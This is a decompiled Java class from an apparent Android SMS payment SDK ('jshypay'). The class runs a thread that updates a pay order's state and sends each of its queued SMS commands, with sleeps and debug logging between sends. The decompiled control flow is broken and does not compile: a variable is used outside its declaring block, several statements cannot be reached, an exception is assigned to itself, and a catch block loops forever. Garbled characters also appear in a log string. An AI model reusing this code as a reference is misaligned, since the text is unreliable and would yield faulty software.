package com.jshymedia.jshypay.service;

import com.jshymedia.jshypay.order.PayOrder;
import com.jshymedia.jshypay.order.SmsComm;
import com.jshymedia.jshypay.ztool.Zlog;
import java.util.ArrayList;
import java.util.Iterator;

final class d
  implements Runnable
{
  d(SysService paramSysService, PayOrder paramPayOrder) {}
  
  public final void run()
  {
    this.b.setState(12);
    Iterator localIterator = this.b.getSmsComms().iterator();
    for (;;)
    {
      if (!localIterator.hasNext()) {
        return;
      }
      SmsComm localSmsComm = (SmsComm)localIterator.next();
      if (!localSmsComm.checkToSend())
      {
        Zlog.syso("comm..send..check..!!!...false");
        continue;
      }
      try
      {
        Thread.sleep(500L);
        if ((this.b.isFinish()) && (this.b.getOrderResult() != 5)) {
          continue;
        }
        Zlog.syso("send..state:" + this.b.isFinish() + this.b.getOrderResult());
        i = localSmsComm.hashCode();
        int j = this.b.getOrderId();
        SysService.a(this.a, null, localSmsComm, j);
      }
      catch (InterruptedException localInterruptedException2)
      {
        try
        {
          int i;
          Zlog.syso("sleep..:" + localSmsComm.distance);
          Thread.sleep(localSmsComm.distance);
          Zlog.syso("smscomm-hashcodeï¼š" + i);
          continue;
          localInterruptedException2 = localInterruptedException2;
          localInterruptedException2.printStackTrace();
        }
        catch (InterruptedException localInterruptedException1)
        {
          for (;;)
          {
            localInterruptedException1.printStackTrace();
          }
        }
      }
    }
  }
}
